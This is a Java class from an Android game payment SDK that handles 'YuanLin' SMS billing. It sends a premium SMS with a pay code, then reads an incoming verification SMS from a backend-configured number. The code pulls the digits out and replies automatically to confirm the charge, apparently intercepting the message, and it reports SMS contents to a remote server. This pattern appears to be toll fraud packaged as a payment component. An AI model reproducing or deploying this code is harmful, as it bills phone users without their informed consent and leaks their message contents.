package mobi.zty.pay.sdk.yuanlin;

import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PaymentInterf;
import mobi.zty.sdk.game.Constants;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.GroupFeeInfo;
import mobi.zty.sdk.game.bean.MkInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.Util_G;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;

/**
 *园林支付管理类
 * @author Administrator
 *
 */
public class YuanLinInstance extends PaymentInterf{
	private static YuanLinInstance instance;
	private Handler callBHandler = null;
	private String vertifyNum;
	private Context context;
	public static YuanLinInstance getInstance(){
		if(instance==null){
			instance = scyMMpay();
		}
		return instance;
	}
	private static synchronized YuanLinInstance scyMMpay(){
		if(instance==null){
			instance =  new YuanLinInstance();
		}
		return instance;
	}
	@Override
	public void init(Context context, Object... parameters) {
		this.context = context;
		callBHandler = (Handler) parameters[0];
	}

	@Override
	public void pay(final Context context, Object... parameters) {
		final String ext = (String) parameters[0];
		int feeIndex = (Integer) parameters[1];
		Helper.sendPayMessageToServer(PayConfig.YUANLIN_PAY, "进入支付：", feeIndex);
		FeeInfo feeInfo = (FeeInfo) parameters[2];
		MkInfo mkInfo = (MkInfo) parameters[3];
		
		final String payCode = feeInfo.payCode;
		final String send_num = mkInfo.sendNum;
		this.vertifyNum = mkInfo.vertifyNum;
		String sms_content = payCode+ext;
		Intent itSend = new Intent(Constants.SENT_SMS_ACTION);  
		itSend.putExtra("fee_index", feeIndex);
        PendingIntent mSendPI = PendingIntent.getBroadcast(context.getApplicationContext(), 0, itSend, PendingIntent.FLAG_ONE_SHOT);//这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。   
        Util_G.sendTextMessage(context, send_num, sms_content, mSendPI, 0);
        Util_G.debugE("yuanlin_pay", "send_num==>"+send_num+  "yuanlin_data->"+sms_content);
        Helper.sendPayMessageToServer(PayConfig.YUANLIN_PAY, "发送短信send_num="+send_num+"sms_content="+sms_content, feeIndex);
	}
	
	@Override
	public void sendVerifyCode(Object... parameters) {
		String sendFrom = (String) parameters[0];
		String content = (String) parameters[1];
		int feeIndex = (Integer) parameters[2];
		Helper.sendPayMessageToServer(PayConfig.YUANLIN_PAY, "读取验证码"+content, feeIndex);
		GameSDK instance = GameSDK.getInstance();
		GroupFeeInfo groupFeeInfo = instance.getCurgGroupFeeInfo();
		Util_G.debugE("ALLPAY","vertifyNum——》》"+vertifyNum +"  content==>"+content);
		if (sendFrom.contains(vertifyNum)) {
			groupFeeInfo.getIntdexVerifyMap().put(feeIndex, 2);
			Util_G.debugE("ALLPAY", "vertifyNum——》》开始读取验证码");
			int startIndex = -1;
			int endIndex = 1;
			String munber = "0123456789";
			for (int i = 0; i < content.length(); i++) {
				String cr = content.charAt(i) + "";
				if (startIndex < 0 && munber.contains(cr)) {
					startIndex = i;
				} else if (startIndex >= 0 && !munber.contains(cr)) {
					endIndex = i;
					if (endIndex - startIndex < 3) {
						startIndex = -1;
						continue;
					} else {
						break;
					}
				}
			}
			String vetif_vode = content.substring(startIndex, endIndex);
			Util_G.debugE("ALLPAY", "vertifyNum——》》" + vetif_vode);

			Intent itSend = new Intent(Constants.SENT_SMS_ACTION);
			PendingIntent mSendPI = PendingIntent.getBroadcast(
					context.getApplicationContext(), 0, itSend,
					PendingIntent.FLAG_ONE_SHOT);// 这里requestCode和flag的设置很重要，影响数据KEY_PHONENUM的传递。
			itSend.putExtra("fee_index", feeIndex);
			Util_G.sendTextMessage(context, sendFrom, vetif_vode, mSendPI, 0);
			Util_G.debugE("YUANLIN", "YUANLIN_PAY_验证码确认短信" + vetif_vode
					+ "send_num->>" + sendFrom);
			Helper.sendPayMessageToServer(PayConfig.YUANLIN_PAY, "回复验证码：sendFrom"+sendFrom+"vetif_vode="+vetif_vode, feeIndex);
		}else{
			Helper.sendPayMessageToServer(PayConfig.YUANLIN_PAY, "后台配置的拦截端口不是这个"+sendFrom, feeIndex);
		}
	
		super.sendVerifyCode(parameters);
	}
	
}
